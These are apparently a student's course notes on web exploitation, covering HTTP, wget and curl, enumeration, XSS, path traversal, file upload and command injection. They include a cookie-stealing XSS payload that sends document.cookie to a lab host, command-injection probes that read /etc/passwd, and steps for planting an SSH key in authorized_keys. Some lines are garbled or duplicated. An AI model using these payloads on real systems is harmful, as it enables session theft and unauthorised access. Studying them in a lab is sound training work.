# Web Exploitation - Day 1
SERVER/CLIENT RELATIONSHIP
  - Synchronous communications between user and services. All data is not returned, client only receives what is allowedSynchronous communications between user and services

All data is not returned, client only receives what is allowed
  
HYPERTEXT TRANSFER PROTOCOL (HTTP)
  - Request/Reply
    - Various tools to view; tcpdump, wireshark, dev console
    - `GET / HTTP/1.1`
    - `HTTP/1.1 200 OK`
      - HTTP METHODS
        - **GET**
          - GET request may be used to pass data to the server through the URL
        - HEAD
        - **POST**
        - PUT 
      - HTTP RESONSE CODES
        -  10X == Informational
        -  2XX == Success
        -  30XX == Redirection
        -  4XX == Client Error
        -  5XX == Server Error

WGET
  - Recursive Download, recover from broken transfers, SSL/TLS support
  - `wget -r -l2 -P /tmp ftp://ftpserver/` - (-l2): two layers deep, (-P): can save it to directory thats not CWD
  - `wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' http://website` - post request
  - `wget --load-cookies cookies.txt -p http://....com/interesting/article.php`

CURL
  - Not recursive, can use pipes, upload ability
  - supports more protocols vs WGET such as SCP, POP3
  - `curl -o stuff.html http://website/stuff.html`
  - `curl 'www..com' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png`
    - -H is header, creating http header

HTML
  - Standardized markup language for browser interpretation of web pages
    - Client side interpretation (web browser)
    - Utilizes elements which are identified by tags
    - Typical refers another "page" for server side interaction
    - Cascading Stylesheet (CSS) for page theme

JavaScript
  - Allows websites to interact with the client
    - JavaScript runs on the client's machine
    - Coded as .js files or in line with html 

Enummeration
  - Robots.txt
    -  file is utilized by website owners to communicate what file and directory paths web robots (web crawlers) should index
  - Legitimate surfing
  - Tools: NSE scripts, nikto, Burp suite
    - nikto -h x.x.x.x

Cross-Site Scripting (XSS)
  - Insertion of arbitrary code into a web page that executes in the browser of visitors
  - Unsanitized GET, POST, and PUT methods allow JS to operate on websites
  - It is often found in forums that allow HTML
  - ***have to verify that cross-site scripting is even possible***
    - Reflected XSS
      - most common form of XSS
    - Stored XSS
      - relies on vulnerable site
      - only requires user visit page
      - `<img src="http://10.50.XX.XX" onerror="window.open(&quot;http://10.50.CC.CC:8000/ram.png&quot;,&quot;xss&quot;,'height=500,width=500');">`
      - have to proof of concept make sure there is javascript to XSS
        -  `<script>alert('XSS')</script>` - maybe use double quotes
          - put this in a field that looks like its vulnerable to cross site scripting  
          - `<script>document.location="http://10.50.22.27/uploads/cookie_stealer.php?username=+document.cookie;</script>`

Server-Side Injection
  - Directory Traversal/Path Traversal
    -  Ability to read/execute outside web server’s directory
    - uses ../../ (absolute paths) in manipulating variables
      - `view_image.php?file=../../etc/passwd`
        - can add as many `./../../../../`to test whereasfh;AFH
  - Site allows unsanitized file uploads
    - Server doesn’t validate extension or size
    - Allows for code execution → shell
    - Once uploaded, find your file, call your file

Command Injection
  - if unable to get webshell
  - Application on the server is vulnerable by allowing execution of arbitrary data.
    - Again, user input not validated
    - SOHO router with a web page to do ping
      - To test:
        - `; cat /etc/passwd
        - `; whoami`
      - now can 
        - `; ls`

generating new ssh keys 

`ssh-keygen -t rsa -b 4096`

`enter enter enter`

`cat ~/.ssh/id_rsa.pub`

`>>var/www/.ssh/authorized_keys`

`; echo "ssh-keygen balshkgoiheg" >> /var/www/.ssh/authorized_keys











































  
